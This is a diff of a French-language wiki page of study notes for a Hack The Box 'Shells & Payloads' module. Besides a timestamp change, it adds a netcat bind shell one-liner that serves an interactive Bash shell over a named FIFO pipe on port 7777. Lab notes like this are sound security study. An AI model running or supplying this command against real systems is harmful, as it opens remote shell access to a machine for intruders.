@@ -2,7 +2,7 @@
 title: Shells & Payloads
 description: 
 published: true
-date: 2025-05-08T14:36:35.852Z
+date: 2025-05-08T14:39:49.821Z
 tags: htb, module
 editor: markdown
 dateCreated: 2025-05-04T16:19:33.360Z
@@ -114,5 +114,9 @@ nc -nv <ip> 7777
 
 Après avoir vu comment envoyer du texte entre le client et le serveur, nous allons voir comment servir un shell pour établir un vrai Bind Shell.
 
+Lier un shell Bash à la session TCP avec nc et un cannal nommé FIFO:
 
+```
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f
+```
 
